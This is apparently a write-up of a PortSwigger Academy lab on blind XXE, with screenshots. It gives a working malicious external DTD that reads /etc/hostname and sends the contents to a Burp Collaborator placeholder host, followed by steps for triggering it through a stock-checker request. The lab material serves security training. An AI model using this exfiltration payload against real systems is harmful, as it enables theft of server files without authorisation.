## Exploiting blind XXE to exfiltrate data using a malicious external DTD

## Solution

Create a malicious DTD -

On the exploit server create a malicious DTD file with the following contents,

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;

Host this malicious.dtd file in our exploit server.

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL



<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/061074f5-c74c-47d6-9822-a3c6d2cdbc84">

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/f46b964e-6e30-4753-a311-d35a571e5d0f">

Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/acda9d64-2c87-49b1-8e9f-e4d1f78bd8b9">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/890642da-2bb0-4020-a28e-237376c0ad6f">


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/b9ee4515-305e-470d-9b1a-fd0f31072480">

